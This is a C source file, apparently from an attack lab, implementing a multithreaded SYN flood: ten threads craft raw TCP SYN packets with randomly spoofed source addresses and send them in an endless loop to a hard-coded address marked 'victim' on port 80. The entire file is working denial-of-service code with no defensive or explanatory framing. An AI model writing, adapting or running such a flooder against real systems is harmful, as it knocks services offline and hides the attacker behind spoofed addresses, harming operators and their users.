// attacker/syn_flood.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <time.h>

#define NUM_THREADS 10

unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--) sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void *attack(void *arg) {
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    char datagram[4096];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr("192.168.100.10"); // victim

    memset(datagram, 0, 4096);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->daddr = sin.sin_addr.s_addr;

    tcph->dest = htons(80);
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(5840);

    int one = 1;
    const int *val = &one;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

    while (1) {
        iph->saddr = rand(); // spoofed IP
        iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);

        tcph->source = htons(rand() % 65535);
        tcph->seq = rand();
        tcph->check = 0;

        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }
}

int main() {
    srand(time(NULL));
    pthread_t threads[NUM_THREADS];

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_create(&threads[i], NULL, attack, NULL);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
